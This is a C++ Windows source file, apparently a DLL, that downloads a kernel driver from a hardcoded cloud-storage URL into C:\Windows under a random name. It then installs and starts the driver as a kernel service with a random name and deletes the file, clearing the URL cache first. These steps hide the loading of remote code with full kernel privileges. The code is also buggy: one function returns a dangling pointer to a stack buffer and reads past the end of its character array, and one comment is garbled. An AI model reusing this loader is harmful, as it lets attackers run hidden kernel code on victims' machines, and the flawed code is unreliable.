#include"pch.h"
#include"DriverLoad.h"
#pragma comment(lib,"Urlmon.lib")
#pragma comment(lib, "Wininet.lib")
#pragma warning(disable:4996)

const char* KernelUrl = "https://caiba123.oss-cn-beijing.aliyuncs.com/FmDriver.sys";  // Çý¶¯´æ·ÅµØÖ·

char* MakeRandomString(DWORD len)
{

	char str[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijk";

	char name[256] = { 0 };

	for (DWORD i = 0; i < len; i++)
	{
		name[i] = str[rand() % 62];
	}
	return name;
}

char* MakeRandomFilePath(PUCHAR path)
{
	char* mem = (char*)malloc(256);
	memset(mem, 0, 256);
	memcpy(mem, path, strlen((const char*)path));
	strcat(mem, (const char*)MakeRandomString(8));
	strcat(mem, ".sys");
	return mem;
}
char* MakeRandomServiceName() {
	char* mem = (char*)malloc(256);
	memset(mem, 0, 256);
	strcat(mem, (const char*)MakeRandomString(8));
	return mem;
}
BOOLEAN LoadDriverByManager(char* path, char* serviceName)
{
	BOOLEAN bRet = FALSE;
	DWORD dwLastError;
	SC_HANDLE hSCManager;
	SC_HANDLE hService = NULL;

	if (hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS))
	{
		hService = CreateServiceA(
			hSCManager, serviceName,
			serviceName, SERVICE_ALL_ACCESS,
			SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
			SERVICE_ERROR_IGNORE, path,
			NULL, NULL, NULL, NULL, NULL
		);

		if (hService == NULL)
		{
			hService = OpenServiceA(hSCManager, serviceName, SERVICE_ALL_ACCESS);

			if (!hService)
			{
				CloseServiceHandle(hSCManager);
				return FALSE;
			}

		}
		StartServiceA(hService, 0, NULL);
		bRet = TRUE;
	}

	if (hService)
	{
		CloseServiceHandle(hService);
	}

	if (hSCManager)
	{
		CloseServiceHandle(hSCManager);
	}

	return bRet;
}

EXTERN_C BOOLEAN WINAPI LoadDriver() {

	DeleteUrlCacheEntryA(KernelUrl);

	char* sysPath = MakeRandomFilePath((PUCHAR)"C:\\Windows\\");

	HRESULT ret = URLDownloadToFileA(NULL, KernelUrl, sysPath, NULL, NULL);
	if (ret != S_OK)
	{
		return FALSE;
	}

	char* srvName = MakeRandomServiceName();

	LoadDriverByManager(sysPath, srvName);

	DeleteFileA(sysPath);

	return TRUE;
}